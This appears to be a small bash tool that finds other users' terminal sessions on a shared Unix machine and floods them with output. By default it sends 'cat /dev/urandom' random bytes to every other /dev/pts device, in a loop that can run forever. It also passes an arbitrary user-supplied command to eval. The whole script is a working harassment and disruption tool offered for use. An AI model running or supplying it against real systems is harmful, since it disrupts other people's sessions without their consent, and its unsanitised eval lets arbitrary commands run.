#!/bin/bash

# Important variable definitions
CURRENT_PTS=$(tty | sed "s/\/dev\///")
RUN_FOREVER=10
SPAM_TEXT="Hello there :D"

if [[ "$1" == "forever" ]];
then
	RUN_FOREVER=-1
fi

if [[ "$1" != "forever" ]];
then
	RUN_FOREVER=$1
fi

if [[ "$2" == "default" ]];
then
	SPAM_COMMAND="echo 'Hello there :D'"
fi

if [[ "$2" == "" ]];
then
	SPAM_COMMAND="cat /dev/urandom"
fi

if [[ "$2" != "" ]];
then
	if [[ "$2" != "default" ]];
	then
		SPAM_COMMAND="$2"
	fi
fi

COUNT=0
while [[ "$COUNT" != "$RUN_FOREVER" ]];
do
	ALL_PTS=$(who | grep pts)
	ALL_PTS_BUT_MINE=$(echo "$ALL_PTS" | grep -v "$CURRENT_PTS")
	
	# checking for "awk" binary
	HAS_AWK=$(which awk)

	# checking fot "sed" binary
	HAS_SED=$(which sed)

	# trying out the "sed" binary
	if [[ "$HAS_SED" != "" ]];
	then
		echo "[RUNNING LOG] 'sed' is available!"
		PTSES=$(echo "$ALL_PTS_BUT_MINE" | sed -E "s/.*(pts\/[0-9]+).*/\1/")
	fi

	# trying out the "awk" binary
	if [[ "$HAS_AWK" != "" ]];
	then
		echo "[RUNNING LOG] 'awk' is available!"
		PTSES=$(echo "$ALL_PTS_BUT_MINE" | awk '{print $2}')
	fi

	# looping through found sessions
	for PTS_SESSION in $PTSES;
	do
		echo "[OPERATION LOG] Spamming '${PTS_SESSION}'..."
		OPERATION=$(eval "${SPAM_COMMAND}" > /dev/${PTS_SESSION} &)
	
		echo "$PTS_SESSION"
		if [[ "$OPERATION" == "" ]];
		then
			echo "[OPERATION LOG] Spammed '$PTS_SESSION'"
		fi
		if [[ "$OPERATION" != "" ]];
		then
			echo "[OPERATION LOG] An error occurred while spamming '$PTS_SESSION'"
			echo "[OPERATION DEBUG START]"
			echo "$OPERATION"
			echo "[OPERATION DEBUG END]"
		fi
	done

	# incrementing the "COUNT" variable by 1
	COUNT=$(expr ${COUNT} + 1)
done
